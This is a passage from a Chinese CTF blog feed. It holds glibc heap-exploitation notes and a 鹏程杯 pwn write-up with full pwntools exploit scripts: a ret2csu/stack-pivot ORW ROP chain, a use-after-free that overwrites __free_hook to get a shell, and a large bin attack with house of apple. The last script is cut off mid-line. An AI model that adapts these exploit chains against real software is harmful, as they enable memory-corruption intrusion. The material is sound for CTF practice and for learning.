bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin 获得 p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin 获得 p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>bk bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里bk需要覆盖2byte才行，可以优化size，让其只覆盖1byte就行。</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure>

<p>fd bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就是fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul>
<li>kernel 存在很多的 list_head 结构体，我们可以使用 <strong>条件竞争</strong> 来修改指针，借助如同 msg_msg 结构体来进行任意地址写</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.anquanke.com/post/id/197635">How2Heap堆利用学习笔记（三）：Unsafe_unlink</a></li>
<li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-堆基础之Unsafe Unlink)</a></li>
<li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>鹏程杯</title>
    <url>/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/</url>
    <content><![CDATA[<blockquote>
<p>CTF PWN</p>
</blockquote>
<span id="more"></span>

<p>调试时去除alarm函数：使用16进制编辑器，将所有的alarm改成 <code>isnan</code></p>
<p>或者使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g &lt;二进制文件&gt;</span><br></pre></td></tr></table></figure>
<h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>开启PIE和NX保护，漏洞点是一个栈溢出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init_seccomp</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>没有puts，write等可以进行泄露的函数。思路为将某些函数的got表读入bss段，使用ret2csu。</p>
<ul>
<li>读got表需要gadget至少存在可以修改地址内容片段，形如 <code>mov [xxx], xxx</code> 。用于取值，而且需要我们可以控制寄存器的内容</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary silent</span><br><span class="line">0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br></pre></td></tr></table></figure>


<ol>
<li>栈溢出，使用ret2csu，向bss段读入ROP chain。</li>
<li>栈迁移，转到bss段的ROPchain执行</li>
</ol>
<ul>
<li>使用magic 修改read_got 表内容为syscall</li>
<li>泄露出libc_base</li>
<li>继续read ROPchian，栈迁移执行ROPchain</li>
</ul>
<p>需要注意</p>
<ul>
<li>取magic gadget中的ebx时，如果ebx的值为正，则直接取，如果为<strong>负，加0x100000000取补码</strong>。</li>
<li>控制rax，使用函数返回值是rax来控制</li>
<li>栈迁移的重点是控制rsp，也可以使用 pop_rsp 直接控制。</li>
</ul>
<p>最终的exp</p>
<ul>
<li>调试二三十次才明白，<del>但是很快就会忘</del>。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;silent_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400788</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x0000000000400961</span></span><br><span class="line">ret = <span class="number">0x0000000000400696</span></span><br><span class="line">leave_ret = <span class="number">0x0000000004008FC</span></span><br><span class="line">pop_rsp_r13_r14_r15 = <span class="number">0x000000000040095d</span></span><br><span class="line">magic = <span class="number">0x00000000004007e8</span></span><br><span class="line"></span><br><span class="line">read_plt = elf.plt.read</span><br><span class="line">read_got = elf.got.read</span><br><span class="line"></span><br><span class="line">csu_front = <span class="number">0x400940</span></span><br><span class="line">csu_end = <span class="number">0x40095A</span></span><br><span class="line">bss = elf.bss()</span><br><span class="line">stdout = <span class="number">0x601020</span></span><br><span class="line">main_addr = <span class="number">0x0400878</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">csu:    0, 1, call, rdi, rsi, rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.text:0000000000400940 4C 89 FA                      mov     rdx, r15</span></span><br><span class="line"><span class="string">.text:0000000000400943 4C 89 F6                      mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400946 44 89 EF                      mov     edi, r13d</span></span><br><span class="line"><span class="string">.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:0000000000400949</span></span><br><span class="line"><span class="string">.text:000000000040094D 48 83 C3 01                   add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400951 48 39 DD                      cmp     rbp, rbx</span></span><br><span class="line"><span class="string">.text:0000000000400954 75 EA                         jnz     short loc_400940</span></span><br><span class="line"><span class="string">.text:0000000000400954</span></span><br><span class="line"><span class="string">.text:0000000000400956</span></span><br><span class="line"><span class="string">.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34↑j</span></span><br><span class="line"><span class="string">.text:0000000000400956 48 83 C4 08                   add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040095A 5B                            pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040095B 5D                            pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040095C 41 5C                         pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040095E 41 5D                         pop     r13</span></span><br><span class="line"><span class="string">.text:0000000000400960 41 5E                         pop     r14</span></span><br><span class="line"><span class="string">.text:0000000000400962 41 5F                         pop     r15</span></span><br><span class="line"><span class="string">.text:0000000000400964 C3                            retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p1 = cyclic(<span class="number">64</span> + <span class="number">8</span>)</span><br><span class="line">p1 += flat([</span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0x400</span>,</span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x800</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret</span><br><span class="line">])</span><br><span class="line">s(p1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bss ROP chain</span></span><br><span class="line"><span class="comment"># 调用bss段的代码，然后最后 pop rbp 给rbp指定一个值，就是 stdout+0x3d</span></span><br><span class="line"><span class="comment"># 调用magic gadget ，[stdout] 内容</span></span><br><span class="line"><span class="comment"># 0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/2xg &amp;stdout</span></span><br><span class="line"><span class="string">0x601020 &lt;stdout@@GLIBC_2.2.5&gt;: 0x00007fc4d7fec760      0x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; p syscall</span></span><br><span class="line"><span class="string">$1 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d1b520 &lt;syscall&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10wi 0x7fc4d7d1b520</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b520 &lt;syscall&gt;:    mov    rax,rdi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b523 &lt;syscall+3&gt;:  mov    rdi,rsi</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b526 &lt;syscall+6&gt;:  mov    rsi,rdx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b529 &lt;syscall+9&gt;:  mov    rdx,rcx</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52c &lt;syscall+12&gt;: mov    r10,r8</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b52f &lt;syscall+15&gt;: mov    r8,r9</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b532 &lt;syscall+18&gt;: mov    r9,QWORD PTR [rsp+0x8]</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b537 &lt;syscall+23&gt;: syscall</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b539 &lt;syscall+25&gt;: cmp    rax,0xfffffffffffff001</span></span><br><span class="line"><span class="string">   0x7fc4d7d1b53f &lt;syscall+31&gt;: jae    0x7fc4d7d1b542 &lt;syscall+34&gt;</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">pwndbg&gt; p write</span></span><br><span class="line"><span class="string">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fc4d7d100f0 &lt;write&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p2 = flat([</span><br><span class="line">    stdout+<span class="number">0x3d</span>,                        <span class="comment"># rbp</span></span><br><span class="line">    csu_end, <span class="number">0x100000000</span>+<span class="number">0x7fc4d7d1b537</span>-<span class="number">0x00007fc4d7fec760</span>, stdout+<span class="number">0x3d</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    magic,                                                      <span class="comment"># 将stdout 改成syscall</span></span><br><span class="line">    csu_end, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x1</span>,                <span class="comment"># 函数返回值为rax</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, stdout, <span class="number">1</span>, read_got, <span class="number">8</span>,                 <span class="comment"># syscall (1, 1, read_got, 8)。</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, read_got, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0x100</span>,         <span class="comment"># 读入第二个ROPchian</span></span><br><span class="line">    csu_front, <span class="number">0</span>, <span class="number">0</span>, bss+<span class="number">0x1000</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    leave_ret                                                   <span class="comment"># 迁移到第二个bss_chain</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">dbg(p)</span><br><span class="line">s(p2)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - libc.sym.read</span><br><span class="line">lg(<span class="string">&quot;libc.address&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;bss&quot;</span>)</span><br><span class="line"></span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = bss+<span class="number">0x1000</span></span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx; ret&quot;</span>)).__next__() </span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi; ret&quot;</span>)).__next__() </span><br><span class="line"></span><br><span class="line">rop_chian = flat([</span><br><span class="line">    <span class="string">b&#x27;flag\x00\x00\x00\x00&#x27;</span>,  <span class="comment"># 填充8字节</span></span><br><span class="line">    pop_rdi_ret, flag_addr, pop_rsi_ret, <span class="number">0</span>, open_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">3</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, read_addr,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>, pop_rsi_ret, bss+<span class="number">0x400</span>, pop_rdx_ret, <span class="number">0x30</span>, write_addr,</span><br><span class="line">    </span><br><span class="line">])</span><br><span class="line">pause()</span><br><span class="line">s(rop_chian)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>


<h2 id="atuo-coffee-sale-machine"><a href="#atuo-coffee-sale-machine" class="headerlink" title="atuo_coffee_sale_machine"></a>atuo_coffee_sale_machine</h2><p>coffee_list: 存储咖啡信息。<br>两个coffee_left数组，分别是 user 和 admin，是一个 <code>3*7</code> 数组，id和position</p>
<p>user</p>
<ul>
<li>购买，输入id，按照pos顺序进行free</li>
<li>查看，打印出 coffee_list 信息</li>
</ul>
<p>admin</p>
<ul>
<li>replenish：先更新admin coffee_list，然后更新 user coffee_left</li>
<li>change_default，输入id和pos更新内容，然后更新user coffee_left</li>
</ul>
<p>存在两个问题，都可以进行泄露和 get shell</p>
<ul>
<li>admin在 change_default 使，没有先进行update，直接read会导致uaf问题</li>
<li>数组underflow，因为读入的id, pos 没有判断是否小于0。</li>
</ul>
<p>exp如下</p>
<ul>
<li>由于change_default存在更新，容易导致double free 和 无法  replenish 的错误，我们需要中途更新一下admin coffee_left。（<del>菜鸡的眼泪</del></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itob</span>(<span class="params">num</span>): <span class="keyword">return</span> <span class="built_in">str</span>(num).encode()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;pwn_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = elf.process()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, itob(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">idx, con = <span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">b&quot;input the id of what coffee you want to buy&quot;</span>, itob(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Do you want to add something?Y/N&quot;</span>, <span class="string">b&quot;Y&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Ok,please input what you need in coffee&quot;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    menu(<span class="number">0x1145</span>)</span><br><span class="line">    sa(<span class="string">b&quot;please input the admin password&quot;</span>, <span class="string">b&quot;just pwn it&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit_admin</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replenish</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to replenish&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_default</span>(<span class="params"><span class="built_in">id</span>, pos, con</span>):</span><br><span class="line">    admin()</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&gt;&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    sa(<span class="string">b&quot;input the id you want to change&quot;</span>, itob(<span class="built_in">id</span>))</span><br><span class="line">    sa(<span class="string">b&quot;input which coffee you want to change&quot;</span>, itob(pos))</span><br><span class="line">    sa(<span class="string">b&quot;input your content&quot;</span>, con)</span><br><span class="line">    quit_admin()</span><br><span class="line"></span><br><span class="line">free_got = elf.got.free</span><br><span class="line">cofflist = <span class="number">0x4062F0</span></span><br><span class="line">stderr = <span class="number">0x4062e0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">4</span>, p64(cofflist))</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">replenish(<span class="number">1</span>)</span><br><span class="line">change_default(<span class="number">1</span>, <span class="number">2</span>, p64(stderr))</span><br><span class="line">show()</span><br><span class="line">leak = uu64()</span><br><span class="line">libc.address = leak - <span class="number">0x1ed5c0</span></span><br><span class="line">lg(<span class="string">&#x27;libc.address&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    buy(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">4</span>, p64(libc.sym.__free_hook))</span><br><span class="line"></span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">replenish(<span class="number">3</span>)</span><br><span class="line">change_default(<span class="number">3</span>, <span class="number">2</span>, p64(libc.sym.system))</span><br><span class="line"></span><br><span class="line">buy(<span class="number">3</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>出题人很好心的给出了一个堆地址，这样就可以在堆合并时，绕过unlink_chunk的assert</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>问题出现在 读取数据中，存在一个堆溢出写0</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">read_con</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ptr[i] = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  ptr[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们size的限制，这个大小的bin为 tcache, unsorted, large bin</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">size &gt; <span class="number">0x3FF</span> &amp;&amp; size &lt;= <span class="number">0x500</span></span><br></pre></td></tr></table></figure>

<p>泄露出地址，<code>large bin attack</code>，使用house of apple 手段。</p>
<ul>
<li>a-b-c，在a伪造一个堆，但是因为使用puts函数进行show，但是会存在<code>\x00</code> 截断问题，可以将a伪造成一个 free_chunk，并且会因为arena地址无法leak成功。因此需要堆风水一下，让large bin arena最后一字节不为0。</li>
<li>free b, a-b 合并，malloc d, a &amp; d指向同一个chunk，就可以有类似uaf的效果。</li>
<li>large bin attack 的手段： free a, a放入largebin 里，利用d修改a的 <code>bk_nextsize</code> 为  <code>io_list_all-0x20</code> ，释放一个比<code>a</code> size小的chunk <code>e</code>，将<code>e</code>放入large bin里。这样 <code>io_list_all =&gt; heap a</code></li>
<li>house_of_apple：利用d修改a内容，伪造一个<code>fake_io</code></li>
<li>退出，IO流，并且此题没有沙箱</li>
</ul>
<p>house of apple 的exp如下</p>
<ul>
<li>但是这是在我kali的glibc 2.37 下进行的，在libc2.38 patch后会因为arena最后一个字节为0而无法成功，😫，不想风水了</li>
<li>最后凑一个 <code>rdi/flag</code> 。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">data</span>): <span class="keyword">return</span> p.sendline(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">delim, data</span>): <span class="keyword">return</span> p.sendlineafter(delim, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> p.recvline(timeout=<span 